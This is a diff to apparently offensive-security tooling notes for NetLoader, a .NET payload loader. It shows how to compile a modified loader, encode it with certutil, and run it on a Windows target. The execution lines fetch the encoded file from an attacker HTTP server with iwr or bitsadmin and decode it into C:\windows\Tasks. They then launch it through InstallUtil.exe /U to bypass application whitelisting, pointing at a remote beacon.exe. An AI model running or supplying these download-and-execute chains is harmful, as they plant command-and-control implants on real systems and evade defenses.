@@ -83,8 +83,10 @@ NetLoader.exe /debug /path=suspicious.bin /args="analyze,log,report"
 
 The file is compilled with:
 ```powershell
-. 'C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\Roslyn\csc.exe' /t:exe /out:NL-mod.exe  /r:"C:\windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" .\NetLoader-mod.cs
+. 'C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\Roslyn\csc.exe' /t:exe /out:NL-mod.exe /platform:x64 /r:"C:\windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" .\NetLoader-mod.cs
 ```
+> [!NOTE]
+> Change `/platform:x86` for x86 architecture.
 
 And encoded with certutil.
 ```powershell
@@ -92,13 +94,14 @@ Certutil -encode NL-mod.exe nl.enc
 ```
 *Note: Save the encoded file in `./Tools/NetLoader/nl.enc`.*
 
-
 Finally executed with
 ```powershell
-powershell iwr -uri http://192.168.235.130:8000/Tools/NetLoader/nl.enc -outfile C:\\windows\\Tasks\\nl.enc; powershell rm C:\\windows\\Tasks\\vns.exe; powershell certutil -decode C:\\windows\\Tasks\\nl.enc C:\\windows\\Tasks\\vns.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\windows\\Tasks\\vns.exe
+powershell iwr -uri http://192.168.235.130:8000/Tools/NetLoader/nl.enc -outfile C:\\windows\\Tasks\\nl.enc; powershell rm C:\\windows\\Tasks\\vns.exe; powershell certutil -decode C:\\windows\\Tasks\\nl.enc C:\\windows\\Tasks\\vns.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /path=http://192.168.235.130:8000/beacon.exe /U C:\\windows\\Tasks\\vns.exe
 ```
 Or with `bitsadmin`
 ```powershell
-bitsadmin /Transfer myJob http://192.168.235.130:8000/Tools/NetLoader/nl.enc C:\\windows\\Tasks\\nl.enc; powershell rm C:\\windows\\Tasks\\vns.exe; powershell certutil -decode C:\\windows\\Tasks\\nl.enc C:\\windows\\Tasks\\vns.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\windows\\Tasks\\vns.exe
+bitsadmin /Transfer myJob http://192.168.235.130:8000/Tools/NetLoader/nl.enc C:\\windows\\Tasks\\nl.enc; powershell rm C:\\windows\\Tasks\\vns.exe; powershell certutil -decode C:\\windows\\Tasks\\nl.enc C:\\windows\\Tasks\\vns.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /path=http://192.168.235.130:8000/beacon.exe /U C:\\windows\\Tasks\\vns.exe
 ```
+> [!NOTE]
+> For `x86` use `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe`.
 
